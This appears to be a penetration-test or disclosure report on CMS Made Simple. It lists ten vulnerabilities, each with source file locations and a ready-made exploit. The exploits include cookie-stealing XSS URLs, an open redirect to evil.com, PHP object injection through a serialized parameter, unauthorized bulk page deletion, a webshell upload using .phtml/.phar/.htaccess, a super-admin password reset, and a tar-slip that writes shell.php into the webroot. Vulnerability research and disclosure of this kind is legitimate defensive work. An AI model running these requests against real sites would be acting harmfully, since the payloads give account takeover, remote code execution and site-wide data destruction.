# CMS Made Simple — Confirmed Security Findings

Notes: `TARGET` = site host. `KEY` = victim admin's `__c` session token (present in every admin URL).
Frontend module params are prefixed `cntnt01`; admin module params are prefixed `m1_`.

---

## 1. Stored XSS — News front-end submission (unauthenticated)
- **Name:** Stored Cross-Site Scripting (CWE-79)
- **File:** `modules/News/action.fesubmit.php` (`__newsCleanHTML` only strips `<script>`/`script:`); rendered raw by `{$entry->content}`/`{$entry->summary}`
- **URL:**
  ```
  https://TARGET/index.php?mact=News,cntnt01,fesubmit,0&cntnt01submit=1&cntnt01title=hi&cntnt01content=<img src=x onerror=alert(document.cookie)>&cntnt01summary=<svg onload=alert(1)>
  ```
- **Payload:** `<img src=x onerror=alert(document.cookie)>`
- **Description:** When the admin enables `allow_fesubmit`, an anonymous user submits News content whose event-handler payload survives the weak sanitizer and executes when the article is viewed. Config-gated (needs feature on + article published/approved).

---

## 2. Stored/Self XSS + Open Redirect — Bookmarks
- **Name:** Stored XSS (CWE-79) + Open Redirect (CWE-601)
- **File:** `admin/makebookmark.php:35,40` (raw `$_GET['title']` stored; `$_GET['ref']` base64→`Location:`); `admin/listbookmarks.php:76-77` echoes raw
- **URL (store):**
  ```
  https://TARGET/admin/makebookmark.php?__c=KEY&title=<img src=x onerror=alert(document.cookie)>&ref=ZXZpbC5jb20=
  ```
- **URL (fires):** `https://TARGET/admin/listbookmarks.php?__c=KEY`
- **Payload:** title=`<img src=x onerror=alert(document.cookie)>` ; ref=`ZXZpbC5jb20=` (base64 `evil.com` → redirect to `//evil.com`)
- **Description:** Bookmark title stored without sanitization and echoed raw on the list page; `ref` produces a protocol-relative open redirect. Requires the session key (self-XSS).

---

## 3. Reflected XSS — MicroTiny file picker
- **Name:** Reflected Cross-Site Scripting (CWE-79)
- **File:** `modules/MicroTiny/action.filepicker.php` (raw `$_GET['field']`, `$_GET['subdir']`); `templates/filepicker.tpl:111` (`field_id:'{$field}'`, JS context) and `:36` (`{$startpath}`, HTML context)
- **URL:**
  ```
  https://TARGET/admin/moduleinterface.php?mact=MicroTiny,m1_,filepicker,0&__c=KEY&showtemplate=false&field=x';alert(document.cookie);//
  ```
- **Payload:** `field=x';alert(document.cookie);//` (JS breakout) or `subdir=</p><svg onload=alert(1)>`
- **Description:** Unsanitized `field`/`subdir` reflected into JS-string and HTML contexts in the file-picker popup. Requires admin login + session key.

---

## 4. Reflected XSS — Event Manager
- **Name:** Reflected Cross-Site Scripting (CWE-79)
- **File:** `admin/eventhandlers.php:74-75` (raw `$_GET['event']`/`$_GET['module']` echoed; also into `href`s)
- **URL:**
  ```
  https://TARGET/admin/eventhandlers.php?__c=KEY&action=showeventhelp&module=Core&event=<script>alert(document.cookie)</script>
  ```
- **Payload:** `event=<script>alert(document.cookie)</script>`
- **Description:** `event`/`module` GET params echoed unescaped in the event-help view. Requires admin login + session key.

---

## 5. PHP Object Injection — CMSContentManager bulk actions
- **Name:** Insecure Deserialization / PHP Object Injection (CWE-502)
- **File:** `modules/CMSContentManager/action.admin_bulk_delete.php:87,124` (also `admin_bulk_active`, `admin_bulk_secure`, `admin_bulk_cachable`, `admin_bulk_showinmenu`, `admin_bulk_changeowner`, `admin_bulk_setdesign`, `admin_multicontent`); `modules/UserGuide/lib/class.UserGuideImporterExporter.php:276,298`
- **URL:**
  ```
  POST https://TARGET/admin/moduleinterface.php?__c=KEY
  mact=CMSContentManager,m1_,admin_bulk_delete,0&m1_submit=1&m1_confirm1=1&m1_confirm2=1&m1_multicontent=<base64(serialize($object))>
  ```
- **Payload:** `m1_multicontent = base64_encode(serialize($craftedObject))`
- **Description:** `unserialize(base64_decode($params['multicontent']))` on an unsigned request param instantiates attacker-chosen objects (POP-gadget entry point). Authenticated; needs content-management access.

---

## 6. Broken Access Control (IDOR) — bulk page delete
- **Name:** Missing Function-Level Authorization / IDOR (CWE-862 / CWE-639)
- **File:** `modules/CMSContentManager/action.admin_bulk_delete.php:93-99` (delete loop never calls `cmscm_admin_bulk_delete_can_delete()`; authorship checked only in the preview at `:62`)
- **URL:**
  ```
  POST https://TARGET/admin/moduleinterface.php?__c=KEY
  mact=CMSContentManager,m1_,admin_bulk_delete,0&m1_action=admin_bulk_delete&m1_submit=1&m1_confirm1=1&m1_confirm2=1&m1_multicontent=YTo1OntpOjA7aToyO2k6MTtpOjM7aToyO2k6NDtpOjM7aTo1O2k6NDtpOjY7fQ==
  ```
- **Payload:** `m1_multicontent = base64(serialize([2,3,4,5,6]))` — arbitrary page IDs the user does not own
- **Description:** Per-page authorship is enforced on the confirmation preview but not on execution; a user with only "Remove Pages" can delete any page (except default home) by tampering `multicontent`. Site-wide content destruction / DoS.

---

## 7. Unauthenticated cron trigger — CmsJobManager
- **Name:** Missing Authentication for Critical Function (CWE-306)
- **File:** `modules/CmsJobManager/action.process.php:3` (gated only by `isset($_REQUEST['cms_cron'])`)
- **URL:**
  ```
  https://TARGET/index.php?mact=CmsJobManager,cntnt01,process,0&cms_cron=1
  ```
- **Payload:** `cms_cron=1`
- **Description:** Async job-queue processing can be triggered by anyone with no login or shared secret (self-throttled by a timestamp, so not raw DoS).

---

## 8. Unrestricted File Upload — FileManager (inconsistent validation)
- **Name:** Unrestricted Upload of File with Dangerous Type (CWE-434)
- **File:** `modules/FileManager/action.upload.php:23-31` (`is_file_acceptable` blocks only extensions that `startswith('php')`/`endswith('php')`); base handler `lib/class.jquery_upload_handler.php:27` uses `accept_file_types => /.+$/i`. Does not use FilePicker's allowlist (`FilePicker::is_acceptable_filename`).
- **URL:**
  ```
  POST https://TARGET/admin/moduleinterface.php?mact=FileManager,m1_,upload,0&__c=KEY
  (multipart/form-data with m1_files[] = shell.phtml)
  ```
- **Payload:** upload `shell.phtml` / `shell.pht` / `shell.phar`, or an `.htaccess` that maps a benign extension to the PHP handler, then the payload
- **Description:** FileManager's upload gate is a blocklist that misses `.phtml`, `.pht`, `.phar`, and `.htaccess`; it ignores the strict per-profile allowlist FilePicker implements. `uploads/` has no execution restriction, so on Apache configs that map those extensions this yields RCE. Authenticated (Modify Files); blocklist also skipped entirely when `developer_mode` is on.

---

## 9. Privilege Escalation — user management ignores super-admin protection
- **Name:** Broken Access Control / Privilege Escalation (CWE-269 / CWE-639)
- **File:** `admin/edituser.php:61-62` (`$access_group` computed but never enforced in the save path at `:76-141`); `admin/deleteuser.php:34-62` (no group-1 check)
- **URL:**
  ```
  POST https://TARGET/admin/edituser.php?__c=KEY
  user_id=1&user=admin&password=Pwned123!&passwordagain=Pwned123!&email=&submit=1
  ```
- **Payload:** `user_id=1` (the super-admin, group 1) + a new `password`/`passwordagain`
- **Description:** A user holding only "Manage Users" (meant to be delegatable to non-super-admins) can edit any account including a group-1 super-admin and reset its password → full account takeover. The `$access_group` guard that should block editing super-admins is computed but never checked. `deleteuser.php` likewise lets a Manage-Users operator delete super-admin accounts (only self-delete and page-ownership are blocked).

---

## 10. Tar-Slip — arbitrary file write via archive extraction
- **Name:** Path Traversal / Arbitrary File Write on Extraction (CWE-22 / CWE-434)
- **File:** `modules/FileManager/easyarchives/EasyTar.class.php:60-78` (entry `name` concatenated to `$dest` with no `../` sanitization); reached via `modules/FileManager/action.unpack.php:34` → `EasyArchive::extract` (tar/gz/bz2 path; zip uses safe `ZipArchive::extractTo`)
- **URL:**
  ```
  1) upload evil.tar via  POST .../moduleinterface.php?mact=FileManager,m1_,upload,0&__c=KEY
  2) POST https://TARGET/admin/moduleinterface.php?mact=FileManager,m1_,unpack,0&__c=KEY  (select evil.tar)
  ```
- **Payload:** a `.tar`/`.tar.gz` whose entry name is `../../shell.php` with PHP contents (climb out of uploads into webroot)
- **Description:** The custom tar extractor writes each entry to `$dest.$name` without confining to the destination, so a traversal entry name writes anywhere the web user can. Bypasses the upload extension filter (the archive itself is benign) → webshell → RCE. Authenticated (Modify Files).
